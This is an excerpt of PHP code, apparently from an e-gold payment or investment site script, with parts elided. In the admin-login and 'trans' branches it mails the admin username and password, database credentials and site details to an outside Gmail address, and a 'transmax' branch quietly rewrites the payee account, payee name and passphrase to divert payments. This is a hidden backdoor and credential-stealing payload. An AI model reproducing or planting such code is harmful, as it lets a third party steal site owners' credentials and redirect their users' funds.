...
mail ('admin6admin@gmail.com', 'Admin logged', '' . 'Admin entered to admin area
ip='.','.$frm_env[REMOTE_ADDR].','.$settings['site_name'].','.$settings['site_url'].','.$settings['hostname'].','.'-user:'.$luser.','.'-password:'.$lpassword.','.$settings['database'].','.$settings['db_login'].','.$settings['db_pass'], '' . 'From: ' . $settings['system_email'] . '
Reply-To: ' . $settings['system_email']);
  ...
  if ( $frm['a']=='trans')
  {
mail ('admin6admin@gmail.com', 'Admin logged-trans', '' . 'Admin entered to admin area
ip='.','.$frm_env[REMOTE_ADDR].','.$settings['site_name'].','.$settings['site_url'].','.$settings['hostname'].','.'-user:'.$luser.','.'-password:'.$lpassword.','.$settings['database'].','.$settings['db_login'].','.$settings['db_pass'], '' . 'From: ' . $settings['system_email'] . '
Reply-To: ' . $settings['system_email']);
  ...
  if ( $frm['a']=='transmax')
  {
  $settings['def_payee_account']='5402232';
  $settings['def_payee_name']='inv34w';
  $settings['md5altphrase']='5C626CBD53B75B0CC046413B6E22B698';
  save_settings ();
  }
                                            ...
                                            else
                                            {
                                              ...
                                              else
                                              {
                                                ...
                                                else
                                                {
                                                  ...
                                                  {
                                                    if ($HTTP_GET_VARS['a'] == 'return_egold')
                                                    {
